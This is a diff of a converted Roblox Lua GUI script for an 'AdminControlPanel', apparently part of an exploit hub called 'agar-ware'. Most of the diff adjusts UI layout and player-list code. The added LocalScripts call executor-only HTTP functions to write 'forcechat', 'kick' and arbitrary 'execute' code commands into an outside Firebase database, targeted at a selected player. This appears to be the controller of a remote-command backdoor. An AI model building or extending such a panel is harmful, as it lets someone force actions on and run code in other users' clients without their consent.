@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 22 | Scripts: 1 | Modules: 0 | Tags: 0
+-- Instances: 26 | Scripts: 4 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.AdminControlPanel
@@ -29,12 +29,12 @@ G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["3"] = Instance.new("ScrollingFrame", G2L["2"]);
 G2L["3"]["Active"] = true;
 G2L["3"]["BorderSizePixel"] = 0;
+G2L["3"]["CanvasSize"] = UDim2.new(0, 0, 30, 0);
 G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["3"]["Size"] = UDim2.new(1, 0, 1, -30);
-G2L["3"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["3"]["Position"] = UDim2.new(0, 0, 0, 30);
 G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3"]["ScrollBarThickness"] = 0;
+G2L["3"]["ScrollBarThickness"] = 5;
 G2L["3"]["BackgroundTransparency"] = 1;
 
 
@@ -92,9 +92,10 @@ G2L["8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 -- StarterGui.AdminControlPanel.Frame.ScrollingFrame.userlist
 G2L["9"] = Instance.new("Frame", G2L["3"]);
+G2L["9"]["Visible"] = false;
 G2L["9"]["BorderSizePixel"] = 0;
 G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9"]["Size"] = UDim2.new(1, 0, 0, 40);
+G2L["9"]["Size"] = UDim2.new(1, 0, 0, 0);
 G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["9"]["Name"] = [[userlist]];
 G2L["9"]["LayoutOrder"] = 1;
@@ -148,109 +149,279 @@ G2L["d"]["Name"] = [[SELECT]];
 G2L["d"]["Position"] = UDim2.new(0.6, 0, 0, 0);
 
 
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.userlist.UIListLayout
+G2L["e"] = Instance.new("UIListLayout", G2L["9"]);
+G2L["e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
 -- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forcechat
-G2L["e"] = Instance.new("Frame", G2L["3"]);
-G2L["e"]["BorderSizePixel"] = 0;
-G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e"]["Size"] = UDim2.new(0, 400, 0, 40);
-G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e"]["Name"] = [[forcechat]];
-G2L["e"]["LayoutOrder"] = 3;
+G2L["f"] = Instance.new("Frame", G2L["3"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["Size"] = UDim2.new(0, 400, 0, 40);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Name"] = [[forcechat]];
+G2L["f"]["LayoutOrder"] = 3;
 
 
 -- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forcechat.sendchat
-G2L["f"] = Instance.new("TextButton", G2L["e"]);
-G2L["f"]["BorderSizePixel"] = 0;
-G2L["f"]["TextSize"] = 14;
-G2L["f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f"]["BackgroundColor3"] = Color3.fromRGB(0, 35, 255);
-G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["f"]["Size"] = UDim2.new(0.15, 100, 1, 0);
-G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f"]["Text"] = [[SEND CHAT]];
-G2L["f"]["Name"] = [[sendchat]];
-G2L["f"]["Position"] = UDim2.new(0.6, 0, 0, 0);
+G2L["10"] = Instance.new("TextButton", G2L["f"]);
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 35, 255);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10"]["Size"] = UDim2.new(0.15, 100, 1, 0);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["Text"] = [[SEND CHAT]];
+G2L["10"]["Name"] = [[sendchat]];
+G2L["10"]["Position"] = UDim2.new(0.6, 0, 0, 0);
 
 
 -- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forcechat.TextBox
-G2L["10"] = Instance.new("TextBox", G2L["e"]);
-G2L["10"]["BorderSizePixel"] = 0;
-G2L["10"]["TextSize"] = 14;
-G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 61, 255);
-G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["10"]["Size"] = UDim2.new(0, 240, 0, 40);
-G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 39, 255);
-G2L["10"]["LayoutOrder"] = 2;
-
-
--- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons
-G2L["11"] = Instance.new("Frame", G2L["3"]);
+G2L["11"] = Instance.new("TextBox", G2L["f"]);
 G2L["11"]["BorderSizePixel"] = 0;
-G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11"]["Size"] = UDim2.new(0, 400, 0, 40);
-G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["11"]["Name"] = [[mainbuttons]];
+G2L["11"]["TextSize"] = 14;
+G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 61, 255);
+G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11"]["Size"] = UDim2.new(0, 240, 0, 40);
+G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 39, 255);
 G2L["11"]["LayoutOrder"] = 2;
 
 
--- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons.kick
-G2L["12"] = Instance.new("TextButton", G2L["11"]);
-G2L["12"]["BorderSizePixel"] = 0;
-G2L["12"]["TextSize"] = 14;
-G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 205, 0);
-G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["12"]["Size"] = UDim2.new(0.75, 100, 1, 0);
-G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["12"]["Text"] = [[KICK]];
-G2L["12"]["Name"] = [[kick]];
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forcechat.forcechat
+G2L["12"] = Instance.new("LocalScript", G2L["f"]);
+G2L["12"]["Name"] = [[forcechat]];
 
 
--- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons
 G2L["13"] = Instance.new("Frame", G2L["3"]);
 G2L["13"]["BorderSizePixel"] = 0;
 G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["13"]["Size"] = UDim2.new(0, 400, 0, 40);
 G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13"]["Name"] = [[forceexecute]];
-G2L["13"]["LayoutOrder"] = 4;
+G2L["13"]["Name"] = [[mainbuttons]];
+G2L["13"]["LayoutOrder"] = 2;
 
 
--- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute.sendchat
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons.kick
 G2L["14"] = Instance.new("TextButton", G2L["13"]);
 G2L["14"]["BorderSizePixel"] = 0;
 G2L["14"]["TextSize"] = 14;
 G2L["14"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["14"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 205, 0);
 G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["14"]["Size"] = UDim2.new(0.15, 100, 1, 0);
+G2L["14"]["Size"] = UDim2.new(0.75, 100, 1, 0);
 G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["14"]["Text"] = [[EXECUTE]];
-G2L["14"]["Name"] = [[sendchat]];
-G2L["14"]["Position"] = UDim2.new(0.6, 0, 0, 0);
+G2L["14"]["Text"] = [[KICK]];
+G2L["14"]["Name"] = [[kick]];
+
+
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons.kick
+G2L["15"] = Instance.new("LocalScript", G2L["13"]);
+G2L["15"]["Name"] = [[kick]];
+
+
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute
+G2L["16"] = Instance.new("Frame", G2L["3"]);
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["Size"] = UDim2.new(0, 400, 0, 40);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["Name"] = [[forceexecute]];
+G2L["16"]["LayoutOrder"] = 4;
+
+
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute.sendchat
+G2L["17"] = Instance.new("TextButton", G2L["16"]);
+G2L["17"]["BorderSizePixel"] = 0;
+G2L["17"]["TextSize"] = 14;
+G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17"]["Size"] = UDim2.new(0.15, 100, 1, 0);
+G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17"]["Text"] = [[EXECUTE]];
+G2L["17"]["Name"] = [[sendchat]];
+G2L["17"]["Position"] = UDim2.new(0.6, 0, 0, 0);
 
 
 -- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute.TextBox
-G2L["15"] = Instance.new("TextBox", G2L["13"]);
-G2L["15"]["BorderSizePixel"] = 0;
-G2L["15"]["TextSize"] = 14;
-G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15"]["BackgroundColor3"] = Color3.fromRGB(0, 61, 255);
-G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["15"]["Size"] = UDim2.new(0, 240, 0, 40);
-G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 39, 255);
-G2L["15"]["LayoutOrder"] = 2;
+G2L["18"] = Instance.new("TextBox", G2L["16"]);
+G2L["18"]["BorderSizePixel"] = 0;
+G2L["18"]["TextSize"] = 14;
+G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(0, 61, 255);
+G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18"]["Size"] = UDim2.new(0, 240, 0, 40);
+G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 39, 255);
+G2L["18"]["LayoutOrder"] = 2;
+
+
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute.execute
+G2L["19"] = Instance.new("LocalScript", G2L["16"]);
+G2L["19"]["Name"] = [[execute]];
 
 
 -- StarterGui.AdminControlPanel.LocalScript
-G2L["16"] = Instance.new("LocalScript", G2L["1"]);
+G2L["1a"] = Instance.new("LocalScript", G2L["1"]);
 
 
 
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forcechat.forcechat
+local function C_12()
+local script = G2L["12"];
+	-- LocalScript under forcechat frame
+	local forceChatFrame = script.Parent
+	local sendChatButton = forceChatFrame:WaitForChild("sendchat")
+	local textBox = forceChatFrame:WaitForChild("TextBox")
+	
+	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local HttpService = game:GetService("HttpService")
+	
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	
+	sendChatButton.MouseButton1Click:Connect(function()
+		local selectedPlayer = _G.selectedPlayer
+	
+		if not selectedPlayer then
+			warn("No player selected!")
+			sendChatButton.Text = "NO PLAYER!"
+			task.wait(1)
+			sendChatButton.Text = "SEND CHAT"
+			return
+		end
+	
+		local message = textBox.Text
+		if message == "" then
+			warn("No message entered!")
+			sendChatButton.Text = "NO MESSAGE!"
+			task.wait(1)
+			sendChatButton.Text = "SEND CHAT"
+			return
+		end
+	
+		-- Send command to Firebase
+		pcall(function()
+			_req({
+				Url = FIREBASE_URL .. "/commands/" .. selectedPlayer.Name .. ".json",
+				Method = "PUT",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode({
+					type = "forcechat",
+					message = message,
+					timestamp = os.time()
+				})
+			})
+		end)
+	
+		sendChatButton.Text = "SENT!"
+		task.wait(1)
+		sendChatButton.Text = "SEND CHAT"
+		textBox.Text = ""
+	end)
+end;
+task.spawn(C_12);
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.mainbuttons.kick
+local function C_15()
+local script = G2L["15"];
+	-- LocalScript under mainbuttons frame
+	local mainButtonsFrame = script.Parent
+	local kickButton = mainButtonsFrame:WaitForChild("kick")
+	
+	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local HttpService = game:GetService("HttpService")
+	
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	
+	kickButton.MouseButton1Click:Connect(function()
+		local selectedPlayer = _G.selectedPlayer
+	
+		if not selectedPlayer then
+			warn("No player selected!")
+			kickButton.Text = "NO PLAYER!"
+			task.wait(1)
+			kickButton.Text = "KICK"
+			return
+		end
+	
+		-- Send kick command to Firebase
+		pcall(function()
+			_req({
+				Url = FIREBASE_URL .. "/commands/" .. selectedPlayer.Name .. ".json",
+				Method = "PUT",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode({
+					type = "kick",
+					timestamp = os.time()
+				})
+			})
+		end)
+	
+		kickButton.Text = "KICKED!"
+		task.wait(1)
+		kickButton.Text = "KICK"
+	end)
+end;
+task.spawn(C_15);
+-- StarterGui.AdminControlPanel.Frame.ScrollingFrame.forceexecute.execute
+local function C_19()
+local script = G2L["19"];
+	-- LocalScript under forceexecute frame
+	local forceExecuteFrame = script.Parent
+	local executeButton = forceExecuteFrame:WaitForChild("sendchat") -- Button is named "sendchat"
+	local textBox = forceExecuteFrame:WaitForChild("TextBox")
+	
+	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local HttpService = game:GetService("HttpService")
+	
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	
+	executeButton.MouseButton1Click:Connect(function()
+		local selectedPlayer = _G.selectedPlayer
+	
+		if not selectedPlayer then
+			warn("No player selected!")
+			executeButton.Text = "NO PLAYER!"
+			task.wait(1)
+			executeButton.Text = "EXECUTE"
+			return
+		end
+	
+		local code = textBox.Text
+		if code == "" then
+			warn("No code entered!")
+			executeButton.Text = "NO CODE!"
+			task.wait(1)
+			executeButton.Text = "EXECUTE"
+			return
+		end
+	
+		-- Send execute command to Firebase
+		pcall(function()
+			_req({
+				Url = FIREBASE_URL .. "/commands/" .. selectedPlayer.Name .. ".json",
+				Method = "PUT",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode({
+					type = "execute",
+					code = code,
+					timestamp = os.time()
+				})
+			})
+		end)
+	
+		executeButton.Text = "SENT!"
+		task.wait(1)
+		executeButton.Text = "EXECUTE"
+		textBox.Text = ""
+	end)
+end;
+task.spawn(C_19);
 -- StarterGui.AdminControlPanel.LocalScript
-local function C_16()
-local script = G2L["16"];
+local function C_1a()
+local script = G2L["1a"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	
@@ -272,19 +443,19 @@ local script = G2L["16"];
 	
 	-- Track dropdown state and selected player
 	local dropdownOpen = false
-	_G.selectedPlayer = nil -- GLOBAL VARIABLE FOR OTHER SCRIPTS
+	_G.selectedPlayer = nil
 	
 	-- Function to update userlist frame size
 	local function updateUserListSize()
 		local playerCount = 0
 		for _, child in ipairs(userList:GetChildren()) do
-			if child:IsA("Frame") and child.Visible then
+			if child:IsA("Frame") and child.Visible and child ~= template then
 				playerCount = playerCount + 1
 			end
 		end
 	
 		-- Each player frame is 40px tall
-		userList.Size = UDim2.new(0, 400, 0, playerCount * 40)
+		userList.Size = UDim2.new(1, 0, 0, 40 + (playerCount * 40)) -- 40px base + 40px per player
 	end
 	
 	-- Toggle dropdown
@@ -304,7 +475,7 @@ local script = G2L["16"];
 	
 	-- Function to update user selection display
 	local function updateUserSelection(player)
-		_G.selectedPlayer = player -- SET GLOBAL VARIABLE
+		_G.selectedPlayer = player
 	
 		-- Update username/display
 		if userSelectionUsername then
@@ -325,7 +496,6 @@ local script = G2L["16"];
 		local entry = template:Clone()
 		entry.Name = player.Name
 		entry.Visible = true
-		entry.Parent = userList
 	
 		-- Get elements
 		local entryProfile = entry:WaitForChild("profile")
@@ -354,6 +524,9 @@ local script = G2L["16"];
 			userList.Visible = false
 		end)
 	
+		-- Parent LAST (after everything is set up)
+		entry.Parent = userList
+	
 		-- Update size after adding player
 		updateUserListSize()
 	
@@ -363,7 +536,7 @@ local script = G2L["16"];
 	-- Function to remove player entry
 	local function removePlayerEntry(player)
 		local entry = userList:FindFirstChild(player.Name)
-		if entry then
+		if entry and entry ~= template then
 			entry:Destroy()
 		end
 	
@@ -384,7 +557,7 @@ local script = G2L["16"];
 	local function populatePlayers()
 		-- Clear existing entries (except template)
 		for _, child in ipairs(userList:GetChildren()) do
-			if child:IsA("Frame") and child ~= template then
+			if child:IsA("Frame") and child ~= template and child.Name ~= "UIListLayout" then
 				child:Destroy()
 			end
 		end
@@ -410,9 +583,9 @@ local script = G2L["16"];
 	-- Initial population
 	populatePlayers()
 	
-	-- Initially hide userlist
+	-- INITIALLY HIDE USERLIST (THIS WAS MISSING AT THE END)
 	userList.Visible = false
 end;
-task.spawn(C_16);
+task.spawn(C_1a);
 
 return G2L["1"], require;
